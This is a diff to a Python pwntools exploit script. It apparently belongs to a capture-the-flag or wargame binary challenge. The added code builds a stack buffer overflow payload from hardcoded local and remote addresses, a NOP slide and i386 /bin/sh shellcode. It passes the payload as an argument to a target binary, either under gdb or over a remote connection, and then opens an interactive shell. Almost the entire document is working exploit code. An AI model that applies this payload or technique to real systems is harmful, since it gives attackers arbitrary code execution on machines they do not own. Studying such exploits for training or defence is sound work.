@@ -49,13 +49,49 @@ def get_connection(custom_env=None, argv=None):
 
 
 def exploit():
+    
+    
+    
+    if (LOCAL):
+        addr = 0x0804d3b4
+        addr_of_first_object = p32(addr)
+        addr_of_shellcode = p32(addr + 4)
+    else:
+        addr = 0x804a00c
+        addr_of_first_object = p32(addr)
+        addr_of_shellcode = p32(addr + 4)
 
 
 
-    conn = get_connection()
+  
+    buffer_size = 108
+    shellcode = asm(shellcraft.i386.linux.sh())
+    nop_slide = b"\x90"
+    number_of_nop_slide = buffer_size - len(addr_of_shellcode) - len(addr_of_first_object) - len(shellcode)
+    
+    
+    payload = addr_of_shellcode + nop_slide * number_of_nop_slide + shellcode + addr_of_first_object
+    
+    if not LOCAL:
+        binary_path = f"/home/user/{USER}/{USER}"
+        payload_arg = [binary_path, payload]
+    else:
+        binary_path = f"./Resources/{USER}"
+        payload_arg = [binary_path, payload]
+
+
+    if LOCAL:
+        conn = gdb.debug(payload_arg, '''
+          break *main+131
+          continue
+          ''')
+    else:
+        conn = get_connection(argv=payload_arg)
+    
+    with open("payload", "wb") as f:
+        f.write(payload)
 
     conn.interactive()
-
     
 if __name__ == "__main__":
     exploit()
